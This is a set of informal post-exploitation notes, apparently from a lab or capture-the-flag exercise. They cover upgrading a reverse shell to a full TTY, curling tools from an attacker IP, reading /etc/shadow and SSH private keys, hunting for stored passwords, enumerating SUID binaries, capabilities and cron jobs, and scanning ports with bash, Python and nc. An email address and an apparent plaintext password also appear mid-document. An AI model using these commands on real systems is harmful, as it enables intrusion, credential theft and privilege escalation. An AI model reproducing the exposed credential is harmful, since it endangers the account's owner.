
Got a reverse shell with full access to have to write some code dumb shell to full aceess shell

```
python3 -c "__import__('pty').spawn('/bin/bash')"
stty -raw echo;fg
reset.

export TERM=xterm

```


Make a list of commands to download payloads from the server 

```
curl <attacker_IP>/<tool_name> -o <out_name>
```

```
curl 10.50.88.33/nmap -o nmap_sar
```


To see hidden files 
```
cd / && ls -lah
```


```
hostname
uname -a
lscpu
ps aux


whoami
id
sudo -l
cat /etc/passwd
cat /etc/passwd | cut -d : -f 1
cat /etc/shadow
cat /.ssh/id_rsa


grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
locate password | more
find / -name authorized_keys 2> /dev/null 
find / -name id_rsa 2> /dev/null


sudo -l
find / -perm -u=s -type f 2>/dev/null
strace /usr/local/bin/suid-so 2>&1
env
print $PATH
getcap -r / 2>/dev/null

cat /etc/crontab
cat /etc/exports
```


```
s.singh.kv4.2021@gmail.com

4_tJG--A84K"jitD|ft{73}b,a3]wyg9
```


### Check the OS information
```
cat /etc/os-release
```


### Ping Sweep 

Bash
```
#!/bin/bash  
ports=(21 22 53 80 443 3306 8443 8080)  
for port in ${ports[@]}; do  
timeout 1 bash -c "echo \"Port Scan Test\" > /dev/tcp/1.1.1.1/$port && echo $port is open || /dev/null"   
done
```


Python
```
#!/usr/bin/python3  
import socket  
host = "1.1.1.1"  
portList = [21,22,53,80,443,3306,8443,8080]  
for port in portList:  
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
 try:  
  s.connect((host,port))  
  print("Port ", port, " is open")  
 except:  
  print("Port ", port, " is closed")
```


Netcat aka NC
```
nc -zv <IP_Address> 1-65535
```

I think the best option should be nc but will try the upper one as well but as i am not able to make file with nano/vim/vi will go with nc than

